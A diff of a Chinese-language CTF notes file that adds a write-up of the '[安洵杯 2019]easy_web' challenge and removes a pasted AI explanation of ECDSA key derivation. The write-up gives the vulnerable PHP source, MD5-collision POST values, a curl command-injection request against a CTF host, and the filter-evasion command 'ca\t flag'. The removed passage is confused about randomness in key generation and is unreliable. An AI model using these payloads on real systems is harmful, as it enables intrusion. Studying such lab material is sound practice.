@@ -1,11 +1,13 @@
 ﻿---
-title: "web_answer"
+title: web-未整理解题过程
 date: 2026-01-21 19:39:43
-categories: 默认分类
-tags: [笔记]
+tags: [web-未整理]
+categories:
+  - ctf题解
+  - web
 ---
 
-# 解题过程
+## web-未整理解题过程
 
 ## sql注入
 
@@ -1093,7 +1095,7 @@ highlight_file(__FILE__);
 
 2.直接蚁剑连接，连接虚拟终端
 
-![](C:\Users\21709\Desktop\解题思路\屏幕截图 2025-11-17 223714.png)
+![](/images/屏幕截图 2025-11-17 223714.png)
 
 发现啊linux系统，我们要在里面找flag
 
@@ -2837,7 +2839,7 @@ for p in itertools.permutations("mnopq"):
 
 
 
-![image-20251218152437400](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251218152437400.png)
+![image-20251218152437400](/images/image-20251218152437400.png)
 
 
 
@@ -2845,134 +2847,164 @@ for p in itertools.permutations("mnopq"):
 
 
 
+## [安洵杯 2019]easy_web
+
+### 1
+
+
+
+整个网页就个图片，但是我们发现url有点东西
+
+![image-20260122202902191](/images/image-20260122202902191.png)
+
+img后面跟着乱七八糟的东西，还有一个cmd，那我们就很想利用一下了
+
+直接试了ls，cat发现都被过滤了；而且还发现一直有个提示：md5 is fun
+
+
+
+![image-20260122203011054](/images/image-20260122203011054.png)
+
+看了一下源代码，发现有个base64
+
+于是我把url上面奇怪的字符串用base转了两下，得到16进制，16进制再转utf-8，得到 图片名字 555.png
+
+### <img src="C:\Users\21709\Pictures\Screenshots\屏幕截图 2026-01-22 194211.png" alt="屏幕截图 2026-01-22 194211" style="zoom: 50%;" />
 
 
 
 
 
+<img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260122194100421.png" alt="image-20260122194100421" style="zoom: 67%;" />
 
 
 
+因为在cmd无值的情况下我们仍然在返回页面看到了png，所以先不管cmd；
+
+或许我们是否可以在img传入我们想要看到的文件，
+
+比如源码index.php，但是这里需要刚刚相反的进制转换：
+
+hex*4->
+
+696e6465782e706870
+
+base64*2->->
+
+TmprMlpUWTBOalUzT0RKbE56QTJPRGN3
 
 
 
+得到一堆base64，转码得到：
 
 
-
-
-
-
-
-
-
-从你提供的代码来看，生成的私钥是通过哈希函数和曲线阶数计算得出的。具体来说，私钥是从以下步骤生成的：
-
-1. 计算 SHA-512 哈希值：
-
-   python
-
-   ```
-   digest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(), "big")
-   ```
-
-   ```
-   digest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(), "big")
-   ```
-
-2. 使用 NIST P-521 曲线的阶数对哈希值取模，得到私钥的整数值：
-
-   python
-
-   ```
-   curve_order = NIST521p.order
-   priv_int = digest_int % curve_order
-   ```
-
-   ```
-   curve_order = NIST521p.order
-   priv_int = digest_int % curve_order
-   ```
-
-3. 将私钥整数值转换为字节字符串，并使用 `SigningKey.from_string` 方法生成私钥对象：
-
-   python
-
-   ```
-   priv_bytes = long_to_bytes(priv_int, 66)
-   sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
-   ```
-
-   ```
-   priv_bytes = long_to_bytes(priv_int, 66)
-   sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
-   ```
-
-由于哈希函数是单向的（即不可逆），且在生成私钥的过程中使用了随机数，因此从签名和公钥无法反推出原始的种子。
-
-具体来说，如果攻击者有多个签名和对应的消息，他们也无法从中反推出原始种子。这是因为每组消息和签名都对应着唯一的私钥，而这个私钥是通过哈希函数和曲线阶数计算得出的。
-
-如果你确实需要恢复私钥，并且知道原始种子，那么你可以使用以下脚本来重新生成私钥：
-
-python
 
 ```
-from ecdsa import SigningKey, NIST521p
-from hashlib import sha512
-from Crypto.Util.number import long_to_bytes
+<?php
+error_reporting(E_ALL || ~ E_NOTICE);	//错误被隐藏，后续img和cmd不传参导致的错误不再显示
+header('content-type:text/html;charset=utf-8');
+$cmd = $_GET['cmd'];
+if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
+    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
+$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
 
-# 原始种子
-seed = b"Welcome to this challenge!"
+$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
+if (preg_match("/flag/i", $file)) {
+    echo '<img src ="./ctf3.jpeg">';
+    die("xixi～ no flag");
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
+    echo "<br>";
+}
+echo $cmd;
+echo "<br>";
+if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
+    echo("forbid ~");
+    echo "<br>";
+} else {
+    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
+        echo `$cmd`;
+    } else {
+        echo ("md5 is funny ~");
+    }
+}
 
-# 计算 SHA-512 哈希值
-digest_int = int.from_bytes(sha512(seed).digest(), "big")
-
-# 使用 NIST P-521 曲线的阶数对哈希值取模，得到私钥的整数值
-curve_order = NIST521p.order
-priv_int = digest_int % curve_order
-
-# 将私钥整数值转换为字节字符串，并使用 SigningKey.from_string 方法生成私钥对象
-priv_bytes = long_to_bytes(priv_int, 66)
-sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
-
-# 输出私钥的 PEM 格式
-print(sk.to_pem().decode())
-from ecdsa import SigningKey, NIST521p
-from hashlib import sha512
-from Crypto.Util.number import long_to_bytes
-
-# 原始种子
-seed = b"Welcome to this challenge!"
-
-# 计算 SHA-512 哈希值
-digest_int = int.from_bytes(sha512(seed).digest(), "big")
-
-# 使用 NIST P-521 曲线的阶数对哈希值取模，得到私钥的整数值
-curve_order = NIST521p.order
-priv_int = digest_int % curve_order
-
-# 将私钥整数值转换为字节字符串，并使用 SigningKey.from_string 方法生成私钥对象
-priv_bytes = long_to_bytes(priv_int, 66)
-sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
-
-# 输出私钥的 PEM 格式
-print(sk.to_pem().decode())
+?>
+<html>
+<style>
+  body{
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+}
+</style>
+<body>
+</body>
+</html>
 ```
 
-运行这个脚本，它将输出与原始种子 "Welcome to this challenge!" 对应的私钥。请注意，这个私钥是安全的，不要将其泄露给他人。
+
+
+小知识点：
+
+**`E_ALL || ~ E_NOTICE`**。
+
+- **`~ E_NOTICE`**： `~` 是按位取反运算符。在二进制层面，`E_NOTICE` 的位被置 0，其余位全部置 1。
+- **`||`**： 这是**逻辑或**（Logical OR），不是位或（Bitwise OR `|`）。 在 PHP 中，`E_ALL` 是一个非零整数（True），`~ E_NOTICE` 也是一个非零整数（True）。 **`True || True` 的结果永远是布尔值 `1`。**
 
 
 
 
 
+```
+if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
+        echo `$cmd`;
+    } else {
+        echo ("md5 is funny ~");
+    }
+}
+```
+
+重点：
+
+post传参a，b，MD5强比较绕过
 
 
 
+1.string会强制转换，所以不能传入数组，因为被转换后变成array，值就相等了；
+
+2.!==：值不一样 || 类型不一样 （二选一满足即可）
+
+3.===值和类型都一样
 
 
 
+传入a和b满足值不一样，但是md5过后的值和类型都要一样
+
+```
+a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+```
 
 
-### 
+
+```
+b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+```
+
+考虑过滤，用dir代替ls
+
+```
+curl -X -POST "http://e220bba8-1583-48f3-aa75-54e78da3e6f1.node5.buuoj.cn:81/index.php?img=&cmd=dir+/" -d "a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2"
+```
 
 
 
+![image-20260122202647944](/images/image-20260122202647944.png)
+
+
+
+看到flag，考虑绕过，用ca\t flag
+
+![image-20260122202713163](/images/image-20260122202713163.png)
